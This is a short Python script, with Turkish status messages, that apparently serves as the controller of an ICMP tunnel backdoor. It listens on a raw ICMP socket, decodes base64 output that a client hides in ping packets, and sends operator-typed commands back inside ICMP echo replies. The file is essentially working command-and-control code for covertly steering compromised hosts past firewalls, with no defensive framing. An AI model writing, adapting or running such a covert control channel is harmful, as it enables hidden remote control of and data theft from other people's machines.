import socket
import struct
import base64

ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY = 0

def checksum(source_string):
    sum = 0
    countTo = (len(source_string) // 2) * 2
    count = 0

    while count < countTo:
        thisVal = source_string[count + 1] * 256 + source_string[count]
        sum = sum + thisVal
        sum = sum & 0xffffffff
        count = count + 2

    if countTo < len(source_string):
        sum = sum + source_string[len(source_string) - 1]
        sum = sum & 0xffffffff

    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def receive_one_ping(sock):
    packet, addr = sock.recvfrom(1024)
    icmp_header = packet[20:28]
    data = packet[28:]

    icmp_type, code, checksum, packet_id, sequence = struct.unpack('bbHHh', icmp_header)

    if icmp_type == ICMP_ECHO_REQUEST:
        try:
            decoded_data = base64.b64decode(data)
            print(f"Client'tan gelen mesaj: {decoded_data.decode('utf-8')}")
            return addr, packet_id, decoded_data
        except (ValueError, UnicodeDecodeError) as e:
            print("Geçersiz Base64 dizesi alındı veya çözümleme hatası:", e)
            return addr, packet_id, None
    return None, None, data

def send_one_ping(sock, addr, packet_id, response_data):
    icmp_header = struct.pack('bbHHh', ICMP_ECHO_REPLY, 0, 0, packet_id, 1)
    checksum_value = checksum(icmp_header + response_data)
    icmp_header = struct.pack('bbHHh', ICMP_ECHO_REPLY, 0, socket.htons(checksum_value), packet_id, 1)
    packet = icmp_header + response_data
    sock.sendto(packet, addr)

def icmp_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    print("Sunucu dinlemeye başladı...")

    while True:
        addr, packet_id, data = receive_one_ping(sock)
        if addr and data is not None:
            command = input("Enter Command => ")
            command_enc = base64.b64encode(command.encode('utf-8'))
            send_one_ping(sock, addr, packet_id, command_enc)
            print("command sent")

if __name__ == "__main__":
    icmp_server()